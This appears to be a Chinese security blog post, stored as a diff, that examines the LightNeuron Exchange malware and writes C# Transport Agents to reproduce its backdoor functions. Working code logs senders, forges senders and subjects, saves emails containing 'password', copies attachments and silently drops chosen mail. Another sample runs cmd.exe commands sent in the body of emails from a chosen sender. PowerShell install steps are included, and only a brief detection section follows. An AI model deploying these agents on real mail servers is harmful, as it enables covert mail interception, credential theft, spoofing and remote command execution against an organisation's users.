@@ -1,0 +1,531 @@
+I"AK<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>ESET研究发现了一个专门针对Microsoft Exchange的恶意软件LightNeuron，使用一种从未见过的持久性技术：Transport Agent，能够实现以下功能：</p>
+
+<ul>
+  <li>阅读和修改通过邮件服务器的任何电子邮件</li>
+  <li>撰写并发送新电子邮件</li>
+  <li>阻止任何电子邮件。原始收件人将不会收到电子邮件</li>
+</ul>
+
+<p>参考资料：</p>
+
+<p>https://www.welivesecurity.com/2019/05/07/turla-lightneuron-email-too-far/</p>
+
+<p>https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf</p>
+
+<p>本文仅在技术研究的角度，介绍Transport Agent的用法，编写代码实现不同的功能，结合利用思路给出防御建议</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>Transport Agent基础知识</li>
+  <li>Transport Agent的用法</li>
+  <li>使用Transport Agent监控邮件</li>
+  <li>使用Transport Agent修改邮件</li>
+  <li>使用Transport Agent删除邮件</li>
+  <li>使用Transport Agent启动程序</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-transport-agent基础知识">0x02 Transport Agent基础知识</h2>
+<hr />
+
+<p>参考资料</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/dd877026(v=exchg.140)</p>
+
+<h3 id="1transport-agent">1.Transport Agent</h3>
+
+<p>可以用来扩展和修改Exchange的传输行为，以自定义消息的接受，拒绝，路由和传递，以及在各种类型的内容之间进行转换</p>
+
+<p>简单理解，Transport Agents作为Exchange的插件，能够对Exchange的传输行为进行扩展和修改，例如读取、修改和删除传输的每一份邮件</p>
+
+<h3 id="2net-framework-extensions-for-exchange">2..NET Framework Extensions for Exchange</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Microsoft.Exchange.Data</code>命名空间提供了便于执行以下任务的类型：</p>
+
+<ul>
+  <li>读写MIME数据</li>
+  <li>将消息正文和其他文本从一种编码转换为另一种编码</li>
+  <li>读取和写入TNEF数据</li>
+  <li>读写日历和约会</li>
+  <li>转换消息格式；例如，从HTML到RTF</li>
+  <li>响应SMTP事件</li>
+  <li>响应路由事件</li>
+</ul>
+
+<p>简单理解，使用Microsoft.Exchange.Data命名空间能够扩展和修改Exchange的传输行为</p>
+
+<h2 id="0x03-transport-agent的使用">0x03 Transport Agent的使用</h2>
+<hr />
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/aa579185(v=exchg.140)?redirectedfrom=MSDN</p>
+
+<p>C#开发，使用<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.Data</code>命名空间</p>
+
+<p>使用VisualStudio，新建C#项目，项目类型选择类库，引用以下dll：</p>
+
+<ul>
+  <li>Microsoft.Exchange.Data.Common.dll</li>
+  <li>Microsoft.Exchange.Data.Transport.dll</li>
+</ul>
+
+<p>dll可从Exchange服务器上获得，位置为<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%Public</code>，例如<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft\Exchange Server\V15\Public</code></p>
+
+<p>测试代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler (ReceiveMessageEventSource source, EndOfDataEventArgs e)
+
+        {
+            // The following line appends text to the subject of the message that caused the event.
+            e.MailItem.Message.Subject += " - this text appended by MyAgent";
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>编译生成MyAgent.dll</p>
+
+<p>将MyAgent.dll复制到Exchange服务器，保存路径为<code class="language-plaintext highlighter-rouge">C:\test\MyAgent.dll</code></p>
+
+<p>使用Exchange Server PowerShell安装Transport Agent，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-TransportAgent -Name "MySpamFilterAgent" -TransportAgentFactory "MyAgents.MyAgentFactory"  -AssemblyPath "C:\test\MyAgent.dll"
+Enable-TransportAgent MySpamFilterAgent
+Restart-Service MSExchangeTransport
+</code></pre></div></div>
+
+<p>需要重启服务MSExchangeTransport才能够生效</p>
+
+<p>卸载Transport Agent的命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Uninstall-TransportAgent MySpamFilterAgent -Confirm:$false
+Restart-Service MSExchangeTransport
+</code></pre></div></div>
+
+<p>查看这个Transport Agent的命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-TransportAgent MySpamFilterAgent|fl
+</code></pre></div></div>
+
+<p>查看所有Transport Agent的命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-TransportAgent |fl
+</code></pre></div></div>
+
+<p>Transport Agent安装成功后，使用任意用户发送邮件，邮件标题被修改，测试成功</p>
+
+<h2 id="0x04-使用transport-agent实现不同的功能">0x04 使用Transport Agent实现不同的功能</h2>
+<hr />
+
+<h3 id="示例1">示例1</h3>
+
+<p>监控邮件，记录发件人和时间，文件保存为<code class="language-plaintext highlighter-rouge">c:\test\log.txt</code></p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+
+        {
+            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\test\log.txt", true))
+            {
+                file.WriteLine("Sender:" + e.MailItem.Message.Sender.SmtpAddress);
+                file.WriteLine("Date:" + e.MailItem.Message.Date);
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<h3 id="示例2">示例2</h3>
+
+<p>修改邮件的发件人和主题</p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+
+        {
+            // The following line appends text to the subject of the message that caused the event.
+            e.MailItem.Message.Subject += " - this text appended by MyAgent";
+            e.MailItem.Message.From.DisplayName = "test2";
+            e.MailItem.Message.From.SmtpAddress = "test2@test.com";
+            e.MailItem.Message.Sender.DisplayName = "test2";
+            e.MailItem.Message.Sender.SmtpAddress = "test2@test.com";
+        }
+    }
+}
+</code></pre></div></div>
+
+<h3 id="示例3">示例3</h3>
+
+<p>监控邮件，如果邮件中包括字符串<code class="language-plaintext highlighter-rouge">password</code>(不区分大小写)，则将这份邮件保存至<code class="language-plaintext highlighter-rouge">c:\test</code>，文件名称为<code class="language-plaintext highlighter-rouge">&lt;MessageId&gt;.eml</code>(为了避免文件名重复，这是使用唯一的MessageId作为文件名)</p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+
+        {
+
+            long len = e.MailItem.GetMimeReadStream().Length;
+            byte[] heByte = new byte[len];
+            int r = e.MailItem.GetMimeReadStream().Read(heByte, 0, heByte.Length);
+            string searchData = System.Text.Encoding.UTF8.GetString(heByte);
+            if (searchData.IndexOf("password", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
+            {
+                string[] sArray = e.MailItem.Message.MessageId.Split('@');
+                sArray[0] = sArray[0].Substring(1);
+
+                FileStream fs = new FileStream("c:\\test\\" + sArray[0] + ".eml", FileMode.Create);
+                fs.Write(heByte, 0, heByte.Length);
+                fs.Close();
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<h3 id="示例4">示例4</h3>
+
+<p>监控附件，将附件名称保存在<code class="language-plaintext highlighter-rouge">c:\test\log.txt</code>，将所有附件保存至<code class="language-plaintext highlighter-rouge">c:\test</code>，文件名称为附件名称</p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+
+        {
+            if (e.MailItem.Message.Attachments.Count != 0)
+            {
+                foreach (var attachment in e.MailItem.Message.Attachments)
+                {
+                    using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\test\log.txt", true))
+                    {
+                        file.WriteLine(attachment.FileName);
+                    }
+                    FileStream fs = new FileStream("c:\\test\\" + attachment.FileName, FileMode.Create);
+                    attachment.GetContentReadStream().CopyTo(fs);
+                    fs.Close();
+                }
+
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>相比于示例代码3，将数据保存至文件的功能有所区别</p>
+
+<p>示例3采用了先从流中读取数据并保存在字节数组中，再将字节数组转换为字符串，最后通过<code class="language-plaintext highlighter-rouge">FileStream</code>将字符串写入文件，这样虽然效率变慢，但是支持对全文内容进行搜索</p>
+
+<p>示例代码4不需要考虑全文搜索，所以可以使用<code class="language-plaintext highlighter-rouge">Stream.CopyTo</code>复制两个流来提高效率</p>
+
+<h3 id="示例5">示例5</h3>
+
+<p>监控邮件，如果邮件内容包括字符串<code class="language-plaintext highlighter-rouge">alert</code>(不区分大小写)，那么将这份邮件丢弃</p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+        {
+            long len = e.MailItem.GetMimeReadStream().Length;
+            byte[] heByte = new byte[len];
+            int r = e.MailItem.GetMimeReadStream().Read(heByte, 0, heByte.Length);
+            string searchData = System.Text.Encoding.UTF8.GetString(heByte);
+            if (searchData.IndexOf("alert", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
+            {
+                foreach (EnvelopeRecipient ep in e.MailItem.Recipients)
+                {
+                    e.MailItem.Recipients.Remove(ep);
+                }
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<h3 id="示例6">示例6</h3>
+
+<p>监控邮件，如果邮件来自指定用户(testa@test.com)，主题为<code class="language-plaintext highlighter-rouge">command</code>，那么将执行邮件正文中的内容xxxx(格式为command:xxxx/command)</p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+using System.Diagnostics;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+        {
+            if (e.MailItem.Message.From.SmtpAddress == "testa@test.com")
+            {
+                if(e.MailItem.Message.Subject.Contains("command"))
+                {
+                    long len = e.MailItem.Message.Body.GetContentReadStream().Length;
+                    byte[] heByte = new byte[len];
+                    int r = e.MailItem.Message.Body.GetContentReadStream().Read(heByte, 0, heByte.Length);
+                    string myStr = System.Text.Encoding.UTF8.GetString(heByte);
+                    int i = myStr.IndexOf("command:");
+                    int j = myStr.IndexOf("/command");
+                    myStr = myStr.Substring(i + 8, j - i - 8);
+
+                    Process p = new Process();
+                    p.StartInfo.FileName = "cmd.exe";
+                    p.StartInfo.Arguments = "/c" + myStr;
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.RedirectStandardInput = true;
+                    p.StartInfo.RedirectStandardOutput = true;
+                    p.StartInfo.RedirectStandardError = true;
+                    p.StartInfo.CreateNoWindow = true;
+                    p.Start();
+
+                }
+            }
+
+
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>启动的进程权限为<code class="language-plaintext highlighter-rouge">NETWORK SERVICE</code></p>
+
+<h3 id="补充">补充</h3>
+
+<p>为了便于调试，捕获错误并将错误代码输出至文件<code class="language-plaintext highlighter-rouge">c:\test\log.txt</code></p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using Microsoft.Exchange.Data.Transport;
+using Microsoft.Exchange.Data.Transport.Smtp;
+using System.Diagnostics;
+
+namespace MyAgents
+{
+    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
+    {
+        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
+        {
+            return new MyAgent();
+        }
+    }
+    public class MyAgent : SmtpReceiveAgent
+    {
+        public MyAgent()
+        {
+            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
+        }
+        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
+        {
+            try
+            {
+                
+            }
+            catch (Exception ex)
+            {
+                using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\test\log.txt", true))
+                {
+                    file.WriteLine(ex.Message);
+                }
+
+            }
+
+
+        }
+    }
+}
+</code></pre></div></div>
+
+<h2 id="0x05-防御检测">0x05 防御检测</h2>
+<hr />
+
+<h3 id="1查看transport-agent配置">1.查看Transport Agent配置</h3>
+
+<p>使用Exchange Server PowerShell，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-TransportAgent
+</code></pre></div></div>
+
+<p>其他Powershell命令可参考：</p>
+
+<p>https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps#mail-flow</p>
+
+<h3 id="2查看服务日志">2.查看服务日志</h3>
+
+<p>安装Transport Agent需要重启服务MSExchangeTransport</p>
+
+<h3 id="3查看进程">3.查看进程</h3>
+
+<p>使用Transport Agent后，进程w3wp.exe将会加载对应的dll</p>
+
+<p>可以查看进程w3wp.exe是否加载可疑dll</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文介绍了Transport Agent的用法，编写代码实现对邮件的记录、修改和删除，实现了作为后门使用的常用功能，结合利用思路给出防御建议</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
